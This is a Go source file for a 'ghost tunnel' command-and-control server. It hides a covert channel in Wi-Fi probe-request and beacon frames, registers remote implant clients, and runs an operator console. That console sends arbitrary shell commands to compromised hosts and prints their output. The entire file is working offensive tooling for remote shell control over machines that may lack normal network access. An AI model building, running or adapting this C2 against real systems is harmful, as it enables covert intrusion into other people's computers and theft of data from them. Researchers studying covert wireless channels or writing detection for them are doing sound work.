package main

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"os"
	"strconv"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	iconv "gopkg.in/iconv.v1"
)

var err error

// GHServer is a C&C server,
// handles probe-req and send beacon.
type GHServer struct {
	serverID    uint8
	iface       string
	handle      *pcap.Handle
	pr          *TunnelData
	bcn         *TunnelData
	curCltID    uint8
	curOptCltID uint8
	curCltACP   string
	clients     map[string]*clientSession
}

type clientSession struct {
	id       uint8
	name     string
	mac      string
	system   string
	rSeq     uint8
	wSeq     uint8
	conneted bool
}

// TunnelData is the secret data hidden in probe-req and beacon.
type TunnelData struct {
	mac      string
	flag     uint8
	dataType uint8
	seq      uint8
	clientID uint8
	serverID uint8
	length   uint8
	payload  string
}

// New returns a ghost tunnel server.
func New(device string) *GHServer {
	rand.Seed(time.Now().UnixNano())
	return &GHServer{
		serverID: uint8(rand.Intn(256)),
		iface:    device,
		curCltID: 0,
		clients:  make(map[string]*clientSession),
	}
}

// Setup wireless adapter
func (s *GHServer) Setup() {
}

// Run the server.
func (s *GHServer) Run() {
	s.handle, err = pcap.OpenLive(s.iface, 1024, true, 0)
	// s.handle, err = pcap.OpenOffline("../caps/wcc6.pcapng")
	if err != nil {
		log.Fatal(err)
	}
	defer s.handle.Close()
	err = s.handle.SetBPFFilter("type mgt subtype probe-req")
	if err != nil {
		log.Fatal(err)
	}

	packetSource := gopacket.NewPacketSource(s.handle, s.handle.LinkType())
	go func() {
		for packet := range packetSource.Packets() {
			s.handlePacket(packet)
		}
	}()

	s.handleConsole()

}

func (s *GHServer) sendServerHeartBeat() {
	for {
		s.send(s.curOptCltID, TunnelConnHeartBeat, "")
		time.Sleep(30 * time.Second)
	}
}

func (s *GHServer) handlePacket(packet gopacket.Packet) {
	if l1 := packet.Layer(layers.LayerTypeDot11); l1 != nil {
		dot11, _ := l1.(*layers.Dot11)

		if l2 := packet.Layer(layers.LayerTypeDot11MgmtProbeReq); l2 != nil {
			dot11pr, _ := l2.(*layers.Dot11MgmtProbeReq)

			if td := parseProbeReq(dot11pr); td != nil {
				s.pr = td
				s.pr.mac = dot11.Address2.String()

				if c := s.clients[s.pr.mac]; c != nil {
					if c.rSeq == s.pr.seq {
						// This msg has been received.
						return
					}
					if c.rSeq < s.pr.seq {
						c.rSeq = s.pr.seq
					}
				}

				switch s.pr.dataType & 0xF0 {
				case TunnelConn:
					s.handleConn()
					break
				case TunnelShell:
					s.handleShell()
					break
				default:
					break
				}
			}
		}
	}
}

func (s *GHServer) handleConn() {
	switch s.pr.dataType {
	case TunnelConnClientReq:

		if s.clients[s.pr.mac] == nil {
			s.curCltID++
			s.clients[s.pr.mac] = &clientSession{
				id:       s.curCltID,
				name:     s.pr.payload,
				mac:      s.pr.mac,
				rSeq:     s.pr.seq,
				wSeq:     0,
				conneted: true,
			}
			fmt.Printf("\n[*] Client %d online, MAC: %s, Name: %s\nCmd->", s.curCltID, s.pr.mac, s.pr.payload)
			go s.send(s.curCltID, TunnelConnServerResp, s.pr.payload)
		}
		break
	case TunnelConnHeartBeat:
		s.clients[s.pr.mac].conneted = true
		break
	default:
		break
	}
}

func (s *GHServer) handleShell() {
	switch s.pr.dataType {
	case TunnelShellData:
		cd, err := iconv.Open("utf-8", s.curCltACP) // convert utf-8 to gbk
		if err != nil {
			fmt.Println(err)
			break
		}

		defer cd.Close()
		ret := cd.ConvString(s.pr.payload)
		if ret == "" {
			fmt.Println("[!] convert to utf-8 error, show raw data")
			fmt.Print(s.pr.payload)
			break
		}
		fmt.Print(ret)
		break

	case TunnelShellACP:
		fmt.Printf("[*] Shell from Client %d is ready,\n", s.curOptCltID)
		acp := []byte(s.pr.payload)

		for i := len(acp)/2 - 1; i >= 0; i-- {
			opp := len(acp) - 1 - i
			acp[i], acp[opp] = acp[opp], acp[i]
		}
		s.curCltACP = fmt.Sprintf("CP%d", binary.BigEndian.Uint32([]byte(string(acp))))
		fmt.Println("[*] ACP", s.curCltACP)
		break

	default:
		break
	}
}

func (s *GHServer) send(clientID, dataType uint8, payload string) {
	var client *clientSession
	for _, c := range s.clients {
		// client exists
		if c.id == clientID {
			client = c
			break
		}
		fmt.Printf("[!] Client %d not found\n", clientID)
		return
	}

	client.wSeq++
	s.bcn = &TunnelData{
		flag:     ValidTunnelData,
		dataType: dataType,
		seq:      client.wSeq,
		clientID: clientID,
		serverID: s.serverID,
		length:   uint8(len(payload)),
		payload:  payload,
	}

	buf := createBeacon(s.bcn)

	// let the packets fly
	for i := 0; i < 2000; i++ {
		s.handle.WritePacketData(buf)
		time.Sleep(100 * time.Microsecond)
	}
}

func parseProbeReq(probeLayer *layers.Dot11MgmtProbeReq) *TunnelData {
	body := probeLayer.LayerContents()
	var p1, p2 string = "", ""
	if layers.Dot11InformationElementID(body[0]) != layers.Dot11InformationElementIDSSID {
		return nil
	}
	if body[1] > 0 { // length>0
		ssid := body[2 : 2+body[1]]
		if ssid[0] != ValidTunnelData {
			return nil
		}
		t := &TunnelData{
			flag:     ssid[0],
			dataType: ssid[1],
			seq:      ssid[2],
			clientID: ssid[3],
			serverID: ssid[4],
			length:   ssid[5],
		}

		p1 = string(ssid[6 : 6+t.length])

		if (t.dataType & DataInVendor) != 0 {
			t.dataType &= ^DataInVendor
			for i := uint64(6 + t.length); i < uint64(len(body)); i++ {
				if layers.Dot11InformationElementID(body[i]) == layers.Dot11InformationElementIDVendor {
					// only save the last vendor specific field
					p2 = string(body[i+2:])
				}
			}
		}
		t.payload = p1 + p2
		return t
	}
	return nil
}

func createBeacon(t *TunnelData) []byte {
	buf := gopacket.NewSerializeBuffer()
	var p1, p2 string
	p1 = t.payload
	p2 = ""

	vendor := len(t.payload) > 24 // 32-2-6
	if vendor {
		t.length = 0x1A
		t.dataType |= DataInVendor
		p1 = t.payload[0:24]
		p2 = t.payload[24:]
	}

	ssid := []byte{t.flag, t.dataType, t.seq, t.clientID, t.serverID, t.length}
	ssid = append(ssid, []byte(p1)...)

	stack := []gopacket.SerializableLayer{
		&layers.RadioTap{
			DBMAntennaSignal: int8(-10),
			ChannelFrequency: 2562, // (11-1)*50+2512
		},
		&layers.Dot11{
			Address1:       broadcastHw,
			Address2:       customMAC,
			Address3:       customMAC,
			Type:           layers.Dot11TypeMgmtBeacon,
			SequenceNumber: uint16(t.seq),
		},
		&layers.Dot11MgmtBeacon{
			Flags:    uint16(openFlags),
			Interval: 100,
		},
		dot11Info(layers.Dot11InformationElementIDSSID, ssid),
		dot11Info(layers.Dot11InformationElementIDRates, supportedRates),
		dot11Info(layers.Dot11InformationElementIDDSSet, defaultChannel),
		dot11Info(layers.Dot11InformationElementIDTIM, defaultTIM),
		dot11Info(layers.Dot11InformationElementIDERPInfo, defaultERP),
		dot11Info(layers.Dot11InformationElementIDESRates, extendSupportRates),
		dot11Info(layers.Dot11InformationElementIDVendor, defaultVendor),
	}

	if vendor {
		stack = append(stack, dot11Info(layers.Dot11InformationElementIDVendor, []byte(p2)))
	}

	gopacket.SerializeLayers(buf, gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}, stack...)

	return buf.Bytes()
}

func dot11Info(id layers.Dot11InformationElementID, info []byte) *layers.Dot11InformationElement {
	return &layers.Dot11InformationElement{
		ID:     id,
		Length: uint8(len(info) & 0xff),
		Info:   info,
	}
}

func (s *GHServer) handleConsole() {
	stdin := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("Cmd-> ")
		var cmd string
		var param string

		input, _ := stdin.ReadString('\n')
		fmt.Sscan(input, &cmd, &param)

		switch cmd {
		case "sessions":
			s.showSessions()

		case "interact":
			id, err := strconv.Atoi(param)
			if err != nil {
				fmt.Println("[!] Invalid client id")
				break
			}
			s.interact(uint8(id))

		case "help":
			s.showHelp()

		case "":
			break

		case "exit":
			os.Exit(0)

		default:
			fmt.Println("[!] I don't understand")
		}
	}
}

func (s *GHServer) showSessions() {
	if len(s.clients) == 0 {
		fmt.Println("No clients now")
		return
	}
	fmt.Println("ID           MAC                   Name		System")
	for _, c := range s.clients {
		if c.conneted {
			fmt.Printf("%-2d    %-20s   %-10s       %s\n", c.id, c.mac, c.name, c.system)
		}
	}
}

func (s *GHServer) showHelp() {

}

func (s *GHServer) interact(clientID uint8) {
	if len(s.clients) == 0 {
		fmt.Println("[!] No clients")
		return
	}
	for _, c := range s.clients {
		if c.id == clientID {
			break
		}
		fmt.Printf("[!] Client %d not found\n", clientID)
		return
	}

	s.curOptCltID = clientID
	go s.send(s.curOptCltID, TunnelShellInit, "")
	go s.sendServerHeartBeat()

	for {
		stdin := bufio.NewReader(os.Stdin)
		p, _, _ := stdin.ReadLine()
		payload := string(p)
		if payload == "quit" {
			go s.send(s.curOptCltID, TunnelShellQuit, "")
			for _, c := range s.clients {
				if c.id == clientID {
					c.conneted = false
					break
				}
			}
			return
		}
		go s.send(s.curOptCltID, TunnelShellData, payload)
	}
}

func main() {
	server := New("wlp5s0")
	server.Setup()
	server.Run()
}

// flags in TunnelData
const (
	ValidTunnelData uint8 = 0xFE
	DataInVendor    uint8 = 0x80
)

// data type - Tunnel Connection
const (
	TunnelConn uint8 = iota + 0x10
	TunnelConnClientReq
	TunnelConnServerResp
	TunnelConnHeartBeat
)

// data type - Tunnel Shell
const (
	TunnelShell uint8 = iota + 0x20
	TunnelShellInit
	TunnelShellACP
	TunnelShellData
	TunnelShellQuit
)

// Beacon options
var (
	broadcastHw        = []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	customMAC          = []byte{0x00, 0x03, 0x93, 0x54, 0x00, 0x00}
	supportedRates     = []byte{0x82, 0x84, 0x8b, 0x96}
	extendSupportRates = []byte{0x0c, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c}
	openFlags          = 1057
	defaultChannel     = []byte{0x0B}
	defaultTIM         = []byte{0x00, 0x01, 0x00, 0x00}
	defaultERP         = []byte{0x00}
	defaultVendor      = []byte{0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4, 0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00}
)
